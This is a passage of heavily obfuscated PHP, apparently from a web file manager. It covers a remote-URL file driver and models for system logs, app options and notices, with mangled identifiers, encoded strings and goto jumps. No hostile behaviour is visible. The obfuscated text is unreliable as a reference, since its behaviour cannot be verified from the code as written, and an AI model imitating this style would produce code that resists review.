{ $„„¸†éÈ = $this->info($¾Œéº–©); return $„„¸†éÈ[$_SERVER[å¸¿•¶£][202]]; } public function isFile($†ŸÉ¡¬›) { $æ™­¬È¤ = $this->info($†ŸÉ¡¬›); return $æ™­¬È¤[$_SERVER[å¸¿•¶£][202]]; } public function isFolder($¦¬•„ä¸) { return !1; } public function size($ó…˜óøÄ) { $×È¼¡† = $this->info($ó…˜óøÄ); return $×È¼¡†[$_SERVER[å¸¿•¶£][76]]; } public function info($ˆïå¦Óñ) { return $this->infoParse($ˆïå¦Óñ); } public function infoAuth($»šÖ÷İ£) { return $this->infoParse($»šÖ÷İ£); } public function infoWithChildren($Õú¦„’®) { return $this->infoParse($Õú¦„’®); } public function infoFull($šÔ÷±ç×) { return $this->infoParse($šÔ÷±ç×); } private function infoParse($³Éóˆ¬«) { $ìÌ×¦µ™ =& $_SERVER[å¸¿•¶£]; $ö¡²œ§ = $this->header($³Éóˆ¬«); if (!$ö¡²œ§ || !$ö¡²œ§[$ìÌ×¦µ™[756]]) { return !1; } $ò¿ÒùÏ© = _get($ö¡²œ§, $ìÌ×¦µ™[337], 0); $ßº­ÔÛ = array($ìÌ×¦µ™[32] => $ö¡²œ§[$ìÌ×¦µ™[32]], $ìÌ×¦µ™[84] => $³Éóˆ¬«, $ìÌ×¦µ™[33] => $ìÌ×¦µ™[200], $ìÌ×¦µ™[76] => intval($ò¿ÒùÏ©), $ìÌ×¦µ™[174] => get_path_ext($ö¡²œ§[$ìÌ×¦µ™[32]]), $ìÌ×¦µ™[1397] => $ò¿ÒùÏ© > 0 && $ö¡²œ§[$ìÌ×¦µ™[1519]], $ìÌ×¦µ™[1398] => !1); return $ßº­ÔÛ; } private function header($ÒÂä½«ü) { $¡éçĞş =& $_SERVER[å¸¿•¶£]; if (isset(self::$_cacheHeader[$ÒÂä½«ü])) { return self::$_cacheHeader[$ÒÂä½«ü]; } $îî—é—Í = isset($GLOBALS[$¡éçĞş[1520]]) ? $GLOBALS[$¡éçĞş[1520]] : !1; $GLOBALS[$¡éçĞş[1520]] = !0; self::$_cacheHeader[$ÒÂä½«ü] = url_header($ÒÂä½«ü); $GLOBALS[$¡éçĞş[1520]] = $îî—é—Í; return self::$_cacheHeader[$ÒÂä½«ü]; } public function hashSimple($Ä«ÃáŞ¸, $›«‚ÎÜ = false) { $°Œ¨—€¸ =& $_SERVER[å¸¿•¶£]; $º™ÂÃ˜› = $this->info($Ä«ÃáŞ¸); if (!$º™ÂÃ˜› || !$º™ÂÃ˜›[$°Œ¨—€¸[202]]) { return !1; } $şŸ˜Îà  = $º™ÂÃ˜›[$°Œ¨—€¸[76]]; $ˆ„ı Œ¾ = 200; $‹€ïˆ¹Ã = 50; if ($şŸ˜Îà  <= $ˆ„ı Œ¾ * $‹€ïˆ¹Ã) { return md5($this->fileSubstr($Ä«ÃáŞ¸, 0, $şŸ˜Îà )) . $şŸ˜Îà ; } $¥Å×²‡¼ = intval($şŸ˜Îà  / $‹€ïˆ¹Ã); $ı­«Ëô = $°Œ¨—€¸[12]; $ÜƒªŒˆ· = timeFloat(); $¯¶±Ôêğ = 15; for ($ÖÔ¶Éî¨ = 0; $ÖÔ¶Éî¨ < $‹€ïˆ¹Ã; $ÖÔ¶Éî¨++) { if (timeFloat() - $ÜƒªŒˆ· > $¯¶±Ôêğ) { return !1; } $©ÙˆŸ¾ö = $this->fileSubstr($Ä«ÃáŞ¸, $¥Å×²‡¼ * $ÖÔ¶Éî¨, $ˆ„ı Œ¾); if (!$©ÙˆŸ¾ö) { return !1; } $ı­«Ëô .= $©ÙˆŸ¾ö; } $ı­«Ëô .= $this->fileSubstr($Ä«ÃáŞ¸, $şŸ˜Îà  - $ˆ„ı Œ¾, $ˆ„ı Œ¾); return md5($ı­«Ëô) . $şŸ˜Îà ; } public function getContent($ä¹í’) { return $this->fileSubstr($ä¹í’); } public function fileSubstr($ã¸éÃÖº, $¥½§ÈÉ = 0, $Ò¼¡’ò = -1) { $ô‹éé£Ê =& $_SERVER[å¸¿•¶£]; $áõ•ş·¯ = $this->info($ã¸éÃÖº); if (!$áõ•ş·¯ || !$áõ•ş·¯[$ô‹éé£Ê[202]] && $áõ•ş·¯[$ô‹éé£Ê[76]] > 1024 * 1024 * 10) { return !1; } if ($Ò¼¡’ò === -1) { $Ò¼¡’ò = $áõ•ş·¯[$ô‹éé£Ê[76]]; } if ($Ò¼¡’ò == 0) { return $ô‹éé£Ê[12]; } $µËşŠ÷Ñ = array($ô‹éé£Ê[1521] . $¥½§ÈÉ . $ô‹éé£Ê[789] . ($¥½§ÈÉ + $Ò¼¡’ò - 1)); $Ïú ‘¥ = url_request($ã¸éÃÖº, $ô‹éé£Ê[230], !1, $µËşŠ÷Ñ, !1, !1, 30); return $Ïú ‘¥[$ô‹éé£Ê[1209]] ? $Ïú ‘¥[$ô‹éé£Ê[1209]] : $ô‹éé£Ê[12]; } public function download($¥ğÊŞš‰, $—ûÓµ‚û) { Downloader::start($¥ğÊŞš‰, $—ûÓµ‚û); return $—ûÓµ‚û; } } goto aÔ¶‘¢¥õ; dƒ”­µâñ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\56\x4c\x69\147\150\164\101\160\x70"; public $modelType = "\x53\x79\163\x74\x65\155\x4f\x70\x74\x69\157\x6e"; public $field = array("\156\x61\x6d\145", "\147\x72\x6f\x75\x70", "\x64\x65\x73\x63", "\x63\x6f\x6e\164\145\156\x74"); public function listData($ÈÊô¤ä‘ = false, $—áª«ğî = "\155\157\x64\x69\x66\171\x54\x69\155\145", $™Åİ¢Æ = true) { return parent::listData($ÈÊô¤ä‘, $—áª«ğî, $™Åİ¢Æ); } public function remove($ÈöÅÆô–) { $Ê™Ùê = $this->findByName($ÈöÅÆô–); if (!$Ê™Ùê) { return !1; } return parent::remove($Ê™Ùê[$_SERVER[å¸¿•¶£][399]]); } public function add($Ãîºë¬´) { if ($this->findByName($Ãîºë¬´[$_SERVER[å¸¿•¶£][32]])) { return !1; } return parent::insert($Ãîºë¬´); } public function update($ûÚºÖ¿æ, $İÎĞÔê) { $ëë¶³µÊ =& $_SERVER[å¸¿•¶£]; $ôÔƒ­øÚ = $this->findByName($ûÚºÖ¿æ); $°³ğƒÓ = $this->findByName($İÎĞÔê[$ëë¶³µÊ[32]]); if (!$ôÔƒ­øÚ || $°³ğƒÓ && $°³ğƒÓ[$ëë¶³µÊ[399]] != $ôÔƒ­øÚ[$ëë¶³µÊ[399]]) { return !1; } return parent::update($ôÔƒ­øÚ[$ëë¶³µÊ[399]], $İÎĞÔê); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\x65\155\x5f\154\x6f\147"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\124\x69\x6d\145", "\x74\x69\155\x65", "\151\156\163\145\162\x74", "\146\x75\156\143\x74\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ê™¼Ã¦Ã =& $_SERVER[å¸¿•¶£]; return array($ê™¼Ã¦Ã[2195] => LNG($ê™¼Ã¦Ã[2196]), $ê™¼Ã¦Ã[2197] => LNG($ê™¼Ã¦Ã[2198]), $ê™¼Ã¦Ã[1806] => LNG($ê™¼Ã¦Ã[2199]), $ê™¼Ã¦Ã[2200] => LNG($ê™¼Ã¦Ã[2201]), $ê™¼Ã¦Ã[2202] => LNG($ê™¼Ã¦Ã[2203]), $ê™¼Ã¦Ã[2204] => LNG($ê™¼Ã¦Ã[2205]), $ê™¼Ã¦Ã[2206] => LNG($ê™¼Ã¦Ã[2207]), $ê™¼Ã¦Ã[1836] => LNG($ê™¼Ã¦Ã[2207]), $ê™¼Ã¦Ã[1837] => LNG($ê™¼Ã¦Ã[2208]), $ê™¼Ã¦Ã[2209] => LNG($ê™¼Ã¦Ã[2210]), $ê™¼Ã¦Ã[2211] => LNG($ê™¼Ã¦Ã[2212]), $ê™¼Ã¦Ã[2213] => LNG($ê™¼Ã¦Ã[2214]), $ê™¼Ã¦Ã[2215] => LNG($ê™¼Ã¦Ã[2216]), $ê™¼Ã¦Ã[1834] => LNG($ê™¼Ã¦Ã[2217]), $ê™¼Ã¦Ã[2218] => LNG($ê™¼Ã¦Ã[2219]), $ê™¼Ã¦Ã[1841] => LNG($ê™¼Ã¦Ã[2220]), $ê™¼Ã¦Ã[2221] => LNG($ê™¼Ã¦Ã[2222]), $ê™¼Ã¦Ã[2223] => LNG($ê™¼Ã¦Ã[2224]), $ê™¼Ã¦Ã[2225] => LNG($ê™¼Ã¦Ã[2226]), $ê™¼Ã¦Ã[2227] => LNG($ê™¼Ã¦Ã[2228]), $ê™¼Ã¦Ã[1844] => LNG($ê™¼Ã¦Ã[2229]), $ê™¼Ã¦Ã[1845] => LNG($ê™¼Ã¦Ã[2230]), $ê™¼Ã¦Ã[2231] => LNG($ê™¼Ã¦Ã[2232]), $ê™¼Ã¦Ã[2233] => LNG($ê™¼Ã¦Ã[2234]), $ê™¼Ã¦Ã[2235] => LNG($ê™¼Ã¦Ã[2236]), $ê™¼Ã¦Ã[1839] => LNG($ê™¼Ã¦Ã[2237]), $ê™¼Ã¦Ã[2238] => LNG($ê™¼Ã¦Ã[2239]), $ê™¼Ã¦Ã[1838] => LNG($ê™¼Ã¦Ã[2240]), $ê™¼Ã¦Ã[2241] => LNG($ê™¼Ã¦Ã[2242]), $ê™¼Ã¦Ã[2243] => LNG($ê™¼Ã¦Ã[2244]), $ê™¼Ã¦Ã[2245] => LNG($ê™¼Ã¦Ã[2246]), $ê™¼Ã¦Ã[2247] => LNG($ê™¼Ã¦Ã[2247]), $ê™¼Ã¦Ã[2248] => LNG($ê™¼Ã¦Ã[1810]), $ê™¼Ã¦Ã[2249] => LNG($ê™¼Ã¦Ã[2250]), $ê™¼Ã¦Ã[2251] => LNG($ê™¼Ã¦Ã[2252]), $ê™¼Ã¦Ã[2253] => LNG($ê™¼Ã¦Ã[2254]), $ê™¼Ã¦Ã[2255] => LNG($ê™¼Ã¦Ã[2256]), $ê™¼Ã¦Ã[2257] => LNG($ê™¼Ã¦Ã[2258]), $ê™¼Ã¦Ã[2259] => LNG($ê™¼Ã¦Ã[2259]), $ê™¼Ã¦Ã[2260] => LNG($ê™¼Ã¦Ã[2261]), $ê™¼Ã¦Ã[2262] => LNG($ê™¼Ã¦Ã[2263]), $ê™¼Ã¦Ã[2264] => LNG($ê™¼Ã¦Ã[2265]), $ê™¼Ã¦Ã[2266] => LNG($ê™¼Ã¦Ã[2267]), $ê™¼Ã¦Ã[2268] => LNG($ê™¼Ã¦Ã[2269]), $ê™¼Ã¦Ã[2270] => LNG($ê™¼Ã¦Ã[2271])); } private function typeFile() { $ğÈÇÔ¥Ó =& $_SERVER[å¸¿•¶£]; $÷Ñåğ¹Œ = array($ğÈÇÔ¥Ó[1841] => array($ğÈÇÔ¥Ó[1842]), $ğÈÇÔ¥Ó[2213] => array($ğÈÇÔ¥Ó[2272]), $ğÈÇÔ¥Ó[2215] => array($ğÈÇÔ¥Ó[2273]), $ğÈÇÔ¥Ó[1834] => array($ğÈÇÔ¥Ó[1835]), $ğÈÇÔ¥Ó[2223] => array(), $ğÈÇÔ¥Ó[2225] => array(), $ğÈÇÔ¥Ó[2227] => array(), $ğÈÇÔ¥Ó[1844] => array($ğÈÇÔ¥Ó[1846]), $ğÈÇÔ¥Ó[1845] => array($ğÈÇÔ¥Ó[1846]), $ğÈÇÔ¥Ó[2231] => array($ğÈÇÔ¥Ó[2274]), $ğÈÇÔ¥Ó[2233] => array($ğÈÇÔ¥Ó[2274]), $ğÈÇÔ¥Ó[2235] => array($ğÈÇÔ¥Ó[2275]), $ğÈÇÔ¥Ó[2221] => array($ğÈÇÔ¥Ó[2276]), $ğÈÇÔ¥Ó[1839] => array($ğÈÇÔ¥Ó[2277]), $ğÈÇÔ¥Ó[2238] => array($ğÈÇÔ¥Ó[2278]), $ğÈÇÔ¥Ó[1838] => array($ğÈÇÔ¥Ó[1840])); return $÷Ñåğ¹Œ; } private function typeAll() { $—Ù­Èï =& $_SERVER[å¸¿•¶£]; $Ûˆ…à÷¦ = $this->typeList; $‘è´‡´Ç = array_filter($this->typeFile()); foreach ($‘è´‡´Ç as $øªñï => $ğ†´ší) { $Ûˆ…à÷¦[$ğ†´ší[0]] = $Ûˆ…à÷¦[$øªñï]; } $Ûˆ…à÷¦[$—Ù­Èï[1846]] = LNG($—Ù­Èï[2279]); $Ûˆ…à÷¦[$—Ù­Èï[2274]] = LNG($—Ù­Èï[2280]); return $Ûˆ…à÷¦; } public function addLog($ªù·úç, $ËÜ¶°—® = array()) { $¬†òÏì =& $_SERVER[å¸¿•¶£]; if (!isset($this->typeList[$ªù·úç])) { return; } $Ğµ¨ŠÖŒ = USER_ID ? USER_ID : (isset($ËÜ¶°—®[$¬†òÏì[1674]]) ? $ËÜ¶°—®[$¬†òÏì[1674]] : 0); if (!$Ğµ¨ŠÖŒ) { $Ğµ¨ŠÖŒ = (int) Session::get($¬†òÏì[2000]); } if ($ªù·úç == $¬†òÏì[2249] && is_array($ËÜ¶°—®[$¬†òÏì[2281]]) && !$ËÜ¶°—®[$¬†òÏì[2281]]) { return; } $û¿¼–ìØ = get_client_ip(); if (!$ËÜ¶°—® || strlen(json_encode($ËÜ¶°—®)) >= 1024) { $ËÜ¶°—® = array($¬†òÏì[2282] => $û¿¼–ìØ); } else { if (is_array($ËÜ¶°—®)) { $ËÜ¶°—®[$¬†òÏì[2282]] = $û¿¼–ìØ; } else { $ËÜ¶°—® = array($¬†òÏì[1209] => $ËÜ¶°—®, $¬†òÏì[2282] => $û¿¼–ìØ); } } $ËÜ¶°—® = array($¬†òÏì[1664] => Session::sign(), $¬†òÏì[1665] => $Ğµ¨ŠÖŒ, $¬†òÏì[33] => $ªù·úç, $¬†òÏì[1667] => json_encode($ËÜ¶°—®)); parent::add($ËÜ¶°—®); } public function remove($éˆ¥ÈÒó) { $this->where(array($_SERVER[å¸¿•¶£][419] => $éˆ¥ÈÒó))->delete(); } private function _makeOrder($Åäø„˜ = '') { $†Î¹¯Í =& $_SERVER[å¸¿•¶£]; $ş ¯‡Ì§ = $†Î¹¯Í[201]; $í»–ÜØã = array($†Î¹¯Í[450] => $†Î¹¯Í[451], $†Î¹¯Í[452] => $†Î¹¯Í[453]); $Ï´…çƒá = Input::get($†Î¹¯Í[458], $†Î¹¯Í[7], $†Î¹¯Í[2036], array($†Î¹¯Í[1954], $†Î¹¯Í[452])); $Ï´…çƒá = $í»–ÜØã[$Ï´…çƒá]; $Åäø„˜ = $Åäø„˜ . "{$ş ¯‡Ì§}\40{$Ï´…çƒá}"; return $this->order($Åäø„˜); } public function get($ÏÊ°‚ö³ = '') { $ÕñÚ…’ =& $_SERVER[å¸¿•¶£]; if (!$ÏÊ°‚ö³) { show_json(array()); } $¿„¶Í…€ = array(); if ($ÏÊ°‚ö³[$ÕñÚ…’[1674]]) { $¿„¶Í…€[$ÕñÚ…’[1674]] = $ÏÊ°‚ö³[$ÕñÚ…’[1674]]; } if (isset($ÏÊ°‚ö³[$ÕñÚ…’[767]])) { $õåÔÏ… = $ÏÊ°‚ö³[$ÕñÚ…’[767]]; $¤œÅâ = isset($ÏÊ°‚ö³[$ÕñÚ…’[768]]) ? $ÏÊ°‚ö³[$ÕñÚ…’[768]] : time(); $¿„¶Í…€[$ÕñÚ…’[201]] = array($ÕñÚ…’[333], array($õåÔÏ…, $¤œÅâ)); } if ($ÏÊ°‚ö³[$ÕñÚ…’[33]]) { $ı©æã± = explode($ÕñÚ…’[50], $ÏÊ°‚ö³[$ÕñÚ…’[33]]); $ö‡ùÏÆ = $this->typeFile(); $ÇÖ—µ = array(); foreach ($ı©æã± as $«ñ³§˜±) { $ÇÖ—µ[] = $«ñ³§˜±; if (isset($ö‡ùÏÆ[$«ñ³§˜±])) { $ÇÖ—µ = array_merge($ÇÖ—µ, $ö‡ùÏÆ[$«ñ³§˜±]); } } $ÇÖ—µ = array_unique($ÇÖ—µ); if ($ÇÖ—µ) { $¿„¶Í…€[$ÕñÚ…’[33]] = array($ÕñÚ…’[7], $ÇÖ—µ); } } else { $¿„¶Í…€[$ÕñÚ…’[33]] = array($ÕñÚ…’[2283], $ÕñÚ…’[2284]); } if (!empty($ÏÊ°‚ö³[$ÕñÚ…’[2282]])) { $¿„¶Í…€[$ÕñÚ…’[453]] = array($ÕñÚ…’[383], "\x25{$ÏÊ°‚ö³[$ÕñÚ…’[2282]]}\45"); } $¿åËÒØ‘ = $this->_makeOrder()->where($¿„¶Í…€)->selectPage(); if (empty($¿åËÒØ‘[$ÕñÚ…’[369]])) { show_json(array(), !0, $¿åËÒØ‘[$ÕñÚ…’[366]]); } $¿åËÒØ‘[$ÕñÚ…’[369]] = $this->logList($¿åËÒØ‘[$ÕñÚ…’[369]]); return $¿åËÒØ‘; } private function ipAddress(&$†¶şí‘Ó) { $®öóçç =& $_SERVER[å¸¿•¶£]; if (!empty($†¶şí‘Ó[$®öóçç[2282]])) { $ÇáİÆä² = IpLocation::get($†¶şí‘Ó[$®öóçç[2282]]); } else { $ÇáİÆä² = LNG($®öóçç[2285]); } $†¶şí‘Ó[$®öóçç[2286]] = $ÇáİÆä²; } private function descZipDownload($˜¿ûª¥‚, &$ğÉ»Û»») { $ıéÙçé =& $_SERVER[å¸¿•¶£]; if (!isset($˜¿ûª¥‚[$ıéÙçé[2287]])) { return; } $ãª×­Ø = json_decode($˜¿ûª¥‚[$ıéÙçé[2287]], !0); foreach ($ãª×­Ø as $Ğ»±Ùó¥) { try { $ö–Ç×Ç = IO::infoFull($Ğ»±Ùó¥[$ıéÙçé[84]]); } catch (Exception $íÊÀŒùä) { continue; } $˜¿ûª¥‚[$ıéÙçé[84]] = $Ğ»±Ùó¥[$ıéÙçé[84]]; $ğÉ»Û»»[] = $˜¿ûª¥‚[$ıéÙçé[402]] = $ö–Ç×Ç[$ıéÙçé[402]]; $ğÉ»Û»»[] = $˜¿ûª¥‚[$ıéÙçé[2090]] = $ö–Ç×Ç[$ıéÙçé[432]]; break; } return $˜¿ûª¥‚; } private function getSourceList(&$œ©¹¥ïæ) { $ç«ˆ–À  =& $_SERVER[å¸¿•¶£]; $ÙÕéĞÛÕ = array(); foreach ($œ©¹¥ïæ as $Øæ¬õ˜Å => $¥ßÚå£Ü) { $ÜïåôÕÄ = json_decode($¥ßÚå£Ü[$ç«ˆ–À [453]], !0); if ($¥ßÚå£Ü[$ç«ˆ–À [33]] == $ç«ˆ–À [1837]) { $ÜïåôÕÄ = $this->descZipDownload($ÜïåôÕÄ, $ÙÕéĞÛÕ); $œ©¹¥ïæ[$Øæ¬õ˜Å][$ç«ˆ–À [453]] = json_encode($ÜïåôÕÄ); continue; } if (strpos($¥ßÚå£Ü[$ç«ˆ–À [33]], $ç«ˆ–À [2092]) !== 0) { if (!isset($ÜïåôÕÄ[$ç«ˆ–À [84]]) || strpos($¥ßÚå£Ü[$ç«ˆ–À [33]], $ç«ˆ–À [2288]) !== 0) { continue; } try { $´üÏÍïü = IO::infoFull($ÜïåôÕÄ[$ç«ˆ–À [84]]); } catch (Exception $¤ëÓËÀ) { continue; } $ÙÕéĞÛÕ[] = $ÜïåôÕÄ[$ç«ˆ–À [402]] = $´üÏÍïü[$ç«ˆ–À [402]]; $ÙÕéĞÛÕ[] = $ÜïåôÕÄ[$ç«ˆ–À [2090]] = $´üÏÍïü[$ç«ˆ–À [432]]; $œ©¹¥ïæ[$Øæ¬õ˜Å][$ç«ˆ–À [453]] = json_encode($ÜïåôÕÄ); continue; } $ÙÕéĞÛÕ[] = $ÜïåôÕÄ[$ç«ˆ–À [402]]; $ÙÕéĞÛÕ[] = $ÜïåôÕÄ[$ç«ˆ–À [2090]]; if ($ÜïåôÕÄ[$ç«ˆ–À [33]] == $ç«ˆ–À [548]) { $ÙÕéĞÛÕ[] = $ÜïåôÕÄ[$ç«ˆ–À [453]][$ç«ˆ–À [1167]]; $ÙÕéĞÛÕ[] = $ÜïåôÕÄ[$ç«ˆ–À [453]][$ç«ˆ–À [1168]]; } if ($ÜïåôÕÄ[$ç«ˆ–À [33]] == $ç«ˆ–À [2100]) { $ÙÕéĞÛÕ[] = $ÜïåôÕÄ[$ç«ˆ–À [453]][$ç«ˆ–À [402]]; } } if (!$ÙÕéĞÛÕ) { return array(); } return Model($ç«ˆ–À [832])->sourceListInfo($ÙÕéĞÛÕ, !0); } private function logList($ÁıÓÀğ) { $¡‘­Ú¤ =& $_SERVER[å¸¿•¶£]; $ŸÇ÷öÁ = array_to_keyvalue($ÁıÓÀğ, $¡‘­Ú¤[12], $¡‘­Ú¤[1674]); $¨ğÉØˆ = Model($¡‘­Ú¤[525])->userListInfo(array_unique($ŸÇ÷öÁ)); $èİ¢ş = $this->getSourceList($ÁıÓÀğ); $µ³­©À¹ = $this->typeAll(); $€ÌŒçÈ = array(); $Éòñ®¢ş = array(); foreach ($ÁıÓÀğ as $Àê€— => $÷˜ÆÃˆ·) { $ÛæÃñÆ = $÷˜ÆÃˆ·[$¡‘­Ú¤[33]]; $ĞïÛ³Öõ = isset($¨ğÉØˆ[$÷˜ÆÃˆ·[$¡‘­Ú¤[1674]]]) ? $¨ğÉØˆ[$÷˜ÆÃˆ·[$¡‘­Ú¤[1674]]] : !1; $çÂÁ¥Èº = strpos($ÛæÃñÆ, $¡‘­Ú¤[2289]) === 0 ? LNG($¡‘­Ú¤[2290]) : LNG($¡‘­Ú¤[2285]); $÷˜ÆÃˆ·[$¡‘­Ú¤[32]] = isset($ĞïÛ³Öõ[$¡‘­Ú¤[32]]) ? $ĞïÛ³Öõ[$¡‘­Ú¤[32]] : LNG($¡‘­Ú¤[2285]); $÷˜ÆÃˆ·[$¡‘­Ú¤[532]] = isset($ĞïÛ³Öõ[$¡‘­Ú¤[532]]) ? $ĞïÛ³Öõ[$¡‘­Ú¤[532]] : $¡‘­Ú¤[12]; $÷˜ÆÃˆ·[$¡‘­Ú¤[1574]] = isset($µ³­©À¹[$ÛæÃñÆ]) ? $µ³­©À¹[$ÛæÃñÆ] : $çÂÁ¥Èº; $÷˜ÆÃˆ·[$¡‘­Ú¤[2035]] = $ĞïÛ³Öõ; $Òà’®Õå = json_decode($÷˜ÆÃˆ·[$¡‘­Ú¤[453]], !0); $÷˜ÆÃˆ·[$¡‘­Ú¤[2282]] = isset($Òà’®Õå[$¡‘­Ú¤[2282]]) ? $Òà’®Õå[$¡‘­Ú¤[2282]] : $¡‘­Ú¤[12]; $÷˜ÆÃˆ·[$¡‘­Ú¤[2286]] = IpLocation::get($÷˜ÆÃˆ·[$¡‘­Ú¤[2282]]); if (strpos($ÛæÃñÆ, $¡‘­Ú¤[2092]) === 0 || isset($Òà’®Õå[$¡‘­Ú¤[2090]])) { $Òà’®Õå[$¡‘­Ú¤[87]] = $èİ¢ş[$Òà’®Õå[$¡‘­Ú¤[402]]]; $Òà’®Õå[$¡‘­Ú¤[2105]] = $èİ¢ş[$Òà’®Õå[$¡‘­Ú¤[2090]]]; if ($Òà’®Õå[$¡‘­Ú¤[33]] == $¡‘­Ú¤[548]) { $Òà’®Õå[$¡‘­Ú¤[453]][$¡‘­Ú¤[1167]] = $èİ¢ş[$Òà’®Õå[$¡‘­Ú¤[453]][$¡‘­Ú¤[1167]]]; $Òà’®Õå[$¡‘­Ú¤[453]][$¡‘­Ú¤[1168]] = $èİ¢ş[$Òà’®Õå[$¡‘­Ú¤[453]][$¡‘­Ú¤[1168]]]; } if ($Òà’®Õå[$¡‘­Ú¤[33]] == $¡‘­Ú¤[2100]) { $Òà’®Õå[$¡‘­Ú¤[453]][$¡‘­Ú¤[402]] = $èİ¢ş[$Òà’®Õå[$¡‘­Ú¤[453]][$¡‘­Ú¤[402]]]; } if ($Òà’®Õå[$¡‘­Ú¤[33]] == $¡‘­Ú¤[1832]) { $Òà’®Õå[$¡‘­Ú¤[2105]] = $Òà’®Õå[$¡‘­Ú¤[87]]; $Òà’®Õå[$¡‘­Ú¤[2090]] = $Òà’®Õå[$¡‘­Ú¤[2105]][$¡‘­Ú¤[402]]; $Òà’®Õå[$¡‘­Ú¤[87]] = !1; $Òà’®Õå[$¡‘­Ú¤[402]] = $¡‘­Ú¤[12]; } if ($Òà’®Õå[$¡‘­Ú¤[87]] && $Òà’®Õå[$¡‘­Ú¤[87]][$¡‘­Ú¤[411]] == $¡‘­Ú¤[1291]) { $Éòñ®¢ş[] = $÷˜ÆÃˆ·[$¡‘­Ú¤[399]]; unset($ÁıÓÀğ[$Àê€—]); continue; } if ($Òà’®Õå[$¡‘­Ú¤[2105]] && $Òà’®Õå[$¡‘­Ú¤[2105]][$¡‘­Ú¤[411]] == $¡‘­Ú¤[1291]) { $Éòñ®¢ş[] = $÷˜ÆÃˆ·[$¡‘­Ú¤[399]]; unset($ÁıÓÀğ[$Àê€—]); continue; } } $÷˜ÆÃˆ·[$¡‘­Ú¤[453]] = $Òà’®Õå; unset($÷˜ÆÃˆ·[$¡‘­Ú¤[2291]]); $€ÌŒçÈ[] = $÷˜ÆÃˆ·; } $this->clearSystemPathLog($Éòñ®¢ş); return $€ÌŒçÈ; } private function clearSystemPathLog($¾„—ï²û) { $ä¾êÆç =& $_SERVER[å¸¿•¶£]; if (count($¾„—ï²û) == 0) { return; } $ùŸŞş¼ = array($ä¾êÆç[399] => array($ä¾êÆç[7], array_unique($¾„—ï²û))); $this->where($ùŸŞş¼)->delete(); } public function deviceList($÷â¸€íİ, $¢Ê†ïş = 0) { $Ï”êÕó© =& $_SERVER[å¸¿•¶£]; $µ¤ãàËò = array($Ï”êÕó©[1674] => $÷â¸€íİ, $Ï”êÕó©[201] => array($Ï”êÕó©[1021], $¢Ê†ïş), $Ï”êÕó©[33] => $Ï”êÕó©[1806]); $‚ôåæÍ„ = array(); $ßòÀıÌˆ = $this->field($Ï”êÕó©[2292])->where($µ¤ãàËò)->order($Ï”êÕó©[2103])->limit(50)->select(); foreach ($ßòÀıÌˆ as $ÉÕÁ²Ã => $«Ğ¨à‹Ó) { if ($ÉÕÁ²Ã > 0 && abs($«Ğ¨à‹Ó[$Ï”êÕó©[201]] - $ßòÀıÌˆ[$ÉÕÁ²Ã - 1][$Ï”êÕó©[201]]) < 5) { continue; } $Ç¸¿Û´Œ = json_decode($«Ğ¨à‹Ó[$Ï”êÕó©[453]], !0); $«Ğ¨à‹Ó[$Ï”êÕó©[2282]] = isset($Ç¸¿Û´Œ[$Ï”êÕó©[2282]]) ? $Ç¸¿Û´Œ[$Ï”êÕó©[2282]] : $Ï”êÕó©[12]; unset($Ç¸¿Û´Œ[$Ï”êÕó©[2282]]); $÷€İšì¡ = $this->deviceType($Ç¸¿Û´Œ[$Ï”êÕó©[2093]]); if (isset($‚ôåæÍ„[$÷€İšì¡])) { continue; } $«Ğ¨à‹Ó[$Ï”êÕó©[2286]] = IpLocation::get($«Ğ¨à‹Ó[$Ï”êÕó©[2282]]); $«Ğ¨à‹Ó[$Ï”êÕó©[453]] = $Ç¸¿Û´Œ; $‚ôåæÍ„[$÷€İšì¡] = $«Ğ¨à‹Ó; } return array_values($‚ôåæÍ„); } public function deviceType($¹¢î¢Ì) { return $¹¢î¢Ì; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\56\x6e\157\164\x69\x63\145\x4c\151\x73\164"; public $field = array("\x6e\x61\155\145", "\143\157\156\x74\x65\156\164", "\x61\165\164\x68", "\155\x6f\144\x65", "\164\x69\155\x65", "\x74\171\160\145", "\154\x65\166\x65\154", "\x65\x6e\x61\x62\x6c\145", "\163\x6f\x72\164"); public function listData($’£›ì¶Ì = false, $£öİ¶Ì = "\163\157\162\164", $ò‚ã›¸² = false) { return parent::listData($’£›ì¶Ì, $£öİ¶Ì, $ò‚ã›¸²); } public function add($‡îûó) { $Öò¤Çà¥ =& $_SERVER[å¸¿•¶£]; $ÒˆÔæº¾ = time(); if ($‡îûó[$Öò¤Çà¥[16]] == $Öò¤Çà¥[2293]) { $ÒˆÔæº¾ = strtotime($‡îûó[$Öò¤Çà¥[180]]); } $‡îûó[$Öò¤Çà¥[180]] = $ÒˆÔæº¾; return parent::insert($‡îûó); } public function update($³®Ã’€ë, $Ş¡”») { $«Ñş™ò• =& $_SERVER[å¸¿•¶£]; $Õ©øâ‚À = $this->listData($³®Ã’€ë); if (!$Õ©øâ‚À) { return !1; } $ØÃÛŸ€’ = time(); if ($Ş¡”»[$«Ñş™ò•[16]] == $«Ñş™ò•[2293]) { $ØÃÛŸ€’ = strtotime($Ş¡”»[$«Ñş™ò•[180]]); } $Ş¡”»[$«Ñş™ò•[180]] = $ØÃÛŸ€’; return parent::update($³®Ã’€ë, $Ş¡”»); } public function remove($ªÕéü²ú) { $›ƒÛûÃÃ = $this->listData($ªÕéü²ú); if (!$›ƒÛûÃÃ || $›ƒÛûÃÃ[$_SERVER[å¸¿•¶£][1291]]) { return !1; } return parent::remove($ªÕéü²ú); } public function sort($²ÎÓõà¢, $¿üÍÅİÍ) { return parent::update($²ÎÓõà¢, $¿üÍÅİÍ); } public function enable($¤ôô¾€, $Öíî»¤) { return parent::update($¤ôô¾€, array($_SERVER[å¸¿•¶£][2294] => $Öíî»¤)); } private function initUserOption() { $İªªË£¸ =& $_SERVER[å¸¿•¶£]; $this->optionType = $İªªË£¸[2295]; $this->modelType = $İªªË£¸[2296]; $this->field = array($İªªË£¸[2297], $İªªË£¸[32], $İªªË£¸[180], $İªªË£¸[33], $İªªË£¸[2298], $İªªË£¸[756], $İªªË£¸[196]); } public function userNoticeGet($ğ½¹ÍõÖ = false) { $this->initUserOption(); return parent::listData($ğ½¹ÍõÖ, 